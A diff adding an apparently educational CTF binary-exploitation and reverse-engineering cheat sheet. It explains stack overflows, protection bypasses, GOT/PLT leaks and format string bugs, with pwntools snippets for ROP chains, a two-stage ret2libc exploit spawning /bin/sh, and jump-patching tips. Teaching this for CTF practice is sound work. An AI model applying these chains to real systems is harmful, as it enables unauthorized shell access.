@@ -1,0 +1,281 @@
+🧱 1. Memory Layout of a Running Process
+When a binary runs, the OS gives it a virtual address space that looks like this:
+High addresses
+┌─────────────────┐
+│     Stack       │  ← grows downward, local vars, return addresses
+├─────────────────┤
+│       ↓         │
+│       ↑         │
+├─────────────────┤
+│     Heap        │  ← grows upward, malloc'd memory
+├─────────────────┤
+│  BSS segment    │  ← uninitialized global variables
+├─────────────────┤
+│  Data segment   │  ← initialized global variables
+├─────────────────┤
+│  Text segment   │  ← the actual binary code (read-only)
+└─────────────────┘
+Low addresses
+The stack is the most important for pwn. Every time you call a function, the CPU pushes a stack frame onto it.
+
+📦 2. The Stack Frame & Calling Conventions
+When main() calls foo(a, b), this happens on the stack:
+┌──────────────────┐  ← higher addresses
+│   arg1, arg2     │  (in 32-bit, pushed on stack; in 64-bit, passed in registers)
+├──────────────────┤
+│  Return Address  │  ← where to go after foo() returns  ← YOU WANT THIS
+├──────────────────┤
+│   Saved RBP      │  ← caller's base pointer
+├──────────────────┤
+│  Local variables │  ← e.g., char buf[64]
+└──────────────────┘  ← RSP points here (top of stack, low address)
+64-bit calling convention (System V AMD64):
+
+Arguments go in registers: rdi, rsi, rdx, rcx, r8, r9 (in that order)
+Return value goes in rax
+Stack must be 16-byte aligned before a call
+
+32-bit calling convention:
+
+All arguments pushed onto the stack right to left
+Return value in eax
+
+The return address is the crown jewel. If you overwrite it, you control where the program goes next.
+
+💥 3. Buffer Overflow — The Foundation
+cvoid vulnerable() {
+    char buf[64];
+    gets(buf);       // reads unlimited input → classic overflow
+}
+Memory layout:
+[ buf (64 bytes) ][ saved RBP (8 bytes) ][ return address (8 bytes) ]
+If you send 64 + 8 = 72 bytes of junk, the next 8 bytes overwrite the return address.
+Finding the offset:
+pythonfrom pwn import *
+# Generate a cyclic pattern — each 4-byte chunk is unique
+payload = cyclic(200)
+# Run binary, it crashes with a bad address in RIP
+# Read RIP value from crash (e.g. 0x6161616b)
+offset = cyclic_find(0x6161616b)   # → tells you exact offset
+Types of overflow targets:
+
+gets() — no length check, classic
+scanf("%s", buf) — same problem
+strcpy(dst, src) — no bounds check
+read(0, buf, 500) — fine if buf ≥ 500, dangerous if not
+
+
+🛡️ 4. Binary Protections — What's Stopping You
+Always run checksec --file=./binary first. Here's what each protection does and how it's bypassed:
+NX (No-eXecute) / DEP
+
+What: Marks the stack as non-executable. You can't just inject shellcode and jump to it.
+Bypass: ROP (Return Oriented Programming) — reuse existing code in the binary instead of injecting new code.
+
+ASLR (Address Space Layout Randomization)
+
+What: OS randomizes the base address of stack, heap, and libraries on every run.
+Bypass: Leak an address at runtime, calculate offsets from it.
+Note: ASLR is an OS-level protection, not binary-level.
+
+PIE (Position Independent Executable)
+
+What: The binary itself is also loaded at a random address (works with ASLR).
+Without PIE: Binary code is always at the same address (e.g., 0x401000). You can hardcode gadget addresses.
+With PIE: You need to leak the binary base address too.
+Bypass: Leak a binary address, subtract the known offset to get the base.
+
+Stack Canary
+
+What: A random value placed between local variables and the return address. Checked before function returns — if it changed, program crashes.
+Bypass: Leak the canary value (format string), then include it correctly in your overflow payload.
+
+RELRO (Relocation Read-Only)
+
+Partial RELRO: GOT is writable — you can overwrite GOT entries.
+Full RELRO: GOT is read-only after startup — GOT overwrites don't work.
+
+
+🔗 5. GOT and PLT — How Library Functions Work
+This is critical for understanding ret2plt and ret2libc.
+When your binary calls puts("hello"), it doesn't know where puts lives in memory (since libc is loaded at a random address via ASLR). So the compiler uses a two-table indirection:
+Binary calls puts()
+       ↓
+PLT (Procedure Linkage Table)   ← in your binary, fixed address
+  puts@plt: jmp *[puts@got]
+       ↓
+GOT (Global Offset Table)       ← in your binary, fixed address
+  puts@got: [actual address of puts in libc]   ← filled in at runtime
+       ↓
+puts() in libc                  ← random address due to ASLR
+Key insight:
+
+puts@plt — address is fixed, always the same (without PIE)
+puts@got — contains the real libc address of puts, set at runtime
+If you read puts@got, you get the real libc address → leak!
+If you write puts@got, you redirect all future calls to puts → hijack!
+
+
+📚 6. libc — The Key to Everything
+libc (the C standard library) contains functions like puts, printf, system, gets, etc. Most importantly, it contains:
+
+system("/bin/sh") — spawns a shell
+The string /bin/sh itself
+
+The problem: ASLR randomizes libc's base address every run.
+The solution — libc leak: If you can read the GOT entry of any libc function, you know its real address. Since all functions within libc are at fixed offsets from each other, you can calculate everything else:
+pythonleaked_puts = 0x7f1234567890   # read from puts@got
+# From libc binary: puts is at offset 0x84420
+libc_base = leaked_puts - libc.symbols['puts']   # = 0x7f1234567890 - 0x84420
+system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
+How do you know which libc? Either it's given in the challenge, or you can fingerprint it using libc.blukat.me / libc-database using the last 3 nibbles of leaked addresses.
+
+🔄 7. ROP — Return Oriented Programming
+The big idea: Instead of injecting shellcode, you chain together small snippets of existing code that already end in ret. Each snippet does a tiny thing, then returns — and you've set up the stack so it returns to your next snippet.
+These snippets are called gadgets.
+What a gadget looks like
+asmpop rdi ; ret      ← puts whatever is on stack into rdi, then returns
+pop rsi ; ret
+pop rdx ; ret
+ret                ← just returns (used for stack alignment)
+Building a ROP chain
+Goal: call system("/bin/sh")
+In 64-bit, first argument goes in rdi. So you need:
+
+A pop rdi ; ret gadget → to put /bin/sh address into rdi
+Address of /bin/sh string
+Address of system()
+
+Stack layout during overflow:
+┌──────────────────┐
+│  'A' * offset    │  ← junk to fill buffer + saved rbp
+├──────────────────┤
+│  pop rdi ; ret   │  ← overwrite return address with this gadget
+├──────────────────┤
+│  addr of /bin/sh │  ← this gets popped into rdi
+├──────────────────┤
+│  ret             │  ← optional: 16-byte stack alignment for system()
+├──────────────────┤
+│  addr of system()│  ← this is where execution goes next
+└──────────────────┘
+The CPU executes pop rdi → rdi = /bin/sh addr → ret → jumps to system() → shell!
+Finding gadgets
+bashROPgadget --binary ./binary
+ROPgadget --binary ./binary | grep "pop rdi"
+ROPgadget --binary libc.so.6 | grep "pop rdi"
+ropper -f ./binary --search "pop rdi"
+
+🎯 8. Attack Techniques — Building Blocks
+ret2win
+The simplest. There's already a win() function in the binary that prints the flag. You just overflow and redirect rip there. No ROP needed.
+pythonpayload = b'A' * offset + p64(win_addr)
+ret2plt (Leak libc)
+Use puts@plt to print the contents of puts@got — leaking the real libc address. Then return to main and exploit again with real addresses.
+python# Gadgets
+pop_rdi = 0x401234
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main = elf.symbols['main']
+
+payload  = b'A' * offset
+payload += p64(pop_rdi)
+payload += p64(puts_got)    # rdi = address of puts@got
+payload += p64(puts_plt)    # call puts → it prints the real libc address
+payload += p64(main)        # return here to exploit again
+Then read the 8 bytes that come back — that's your libc leak.
+ret2libc
+After leaking libc base, do a second payload calling system("/bin/sh"):
+pythonpayload2  = b'A' * offset
+payload2 += p64(ret)         # stack alignment (system() needs 16-byte aligned stack)
+payload2 += p64(pop_rdi)
+payload2 += p64(bin_sh)
+payload2 += p64(system)
+ret2plt → ret2libc (the full 2-stage exploit)
+This is the standard CTF pwn exploit when you have NX + ASLR:
+Stage 1: Overflow → leak libc via puts(puts@got) → return to main
+Stage 2: Overflow again → system("/bin/sh") using real addresses
+
+🖨️ 9. Format String Vulnerabilities
+cprintf(user_input);        // vulnerable — user controls format string
+printf("%s", user_input);  // safe
+Why it's dangerous: %x, %p, %s, %n are format specifiers that read from/write to the stack.
+Reading the stack
+Input: %p %p %p %p %p %p %p %p
+Output: 0x7fff... 0x0 0x400123 0x61616161 ...
+Each %p pops the next argument off the stack. Since there are no actual arguments, it reads raw stack values — leaking canaries, return addresses, libc pointers.
+Direct parameter access: %7$p reads the 7th value on the stack.
+Finding the canary / libc pointer
+pythonfor i in range(1, 50):
+    p.sendline(f"%{i}$p".encode())
+    leak = p.recvline()
+    print(f"{i}: {leak}")
+# Look for values starting with 0x7f... (libc) or ending in 00 (canary)
+Writing memory with %n
+%n writes the number of characters printed so far into the pointed-to address. This lets you write arbitrary values to arbitrary addresses (GOT overwrites).
+python# pwntools makes this easy:
+from pwn import fmtstr_payload
+payload = fmtstr_payload(offset, {target_addr: value_to_write})
+
+🔬 10. Reverse Engineering Concepts
+The Goal
+Understand what the binary does without source code. You're working at the assembly level, decompiled pseudo-C, or both.
+Disassembly vs Decompilation
+
+Disassembly: Convert machine code → assembly instructions (objdump, radare2)
+Decompilation: Convert assembly → pseudo-C code (Ghidra, IDA, dogbolt.org)
+
+Decompiled code is not exact — variable names are lost, types are guessed. But it gives you the logic.
+Key Assembly Patterns to Recognize
+asm; Comparison + jump (if statement)
+cmp rax, 0
+je  somewhere        ; jump if equal
+jne somewhere        ; jump if not equal
+jg / jl              ; jump if greater/less (signed)
+ja / jb              ; jump if above/below (unsigned)
+
+; Function call
+call 0x401234        ; pushes return addr, jumps to function
+
+; Stack frame setup
+push rbp
+mov rbp, rsp
+sub rsp, 0x40        ; make room for 0x40 bytes of locals
+
+; Return
+leave                ; mov rsp, rbp; pop rbp
+ret                  ; pop return address → jump to it
+
+; Common data ops
+mov rax, [rbp-0x8]   ; load local variable
+lea rax, [rbp-0x40]  ; load address of local buffer (often: char buf[])
+Identifying Vulnerabilities in Ghidra
+Look for these in decompiled output:
+
+gets(local_buf) → always vulnerable
+scanf("%s", &buf) → vulnerable
+strcpy(dst, src) → vulnerable if src is user-controlled
+printf(user_input) → format string
+malloc + no length check → heap overflow
+Comparison: if (input == 0xdeadbeef) → hardcoded key, just send that value
+strcmp with a fixed string → patch the jump or send the right string
+
+Common Rev Challenge Patterns
+Password check: Binary compares your input to a hardcoded value. Find it in strings, or set a breakpoint at the cmp and read the register.
+Custom encoding: Input is XOR'd, shifted, shuffled, then compared. Reverse the operations.
+Anti-debug: Binary checks if it's being debugged and exits. Patch the check (je → jmp, or NOP it out).
+Keygen: Figure out what transformation maps input → expected output, then invert it.
+bash# Patch a binary — flip a conditional jump
+# In GDB: set {unsigned char}0x401234 = 0xeb   (EB = unconditional jmp)
+# 74 = je, 75 = jne, eb = jmp — flipping 74↔75 inverts the condition
+
+🗺️ Summary — The Mental Map
+Buffer overflow
+    → Overwrite return address
+    → NX blocks shellcode → use ROP
+    → ASLR randomizes libc → need a leak
+    → Leak via ret2plt (puts@got)
+    → Calculate libc base
+    → Call system("/bin/sh") via ret2libc
+    → Stack canary blocks overflow → leak canary first via format string
+    → PIE randomizes binary → leak binary address first
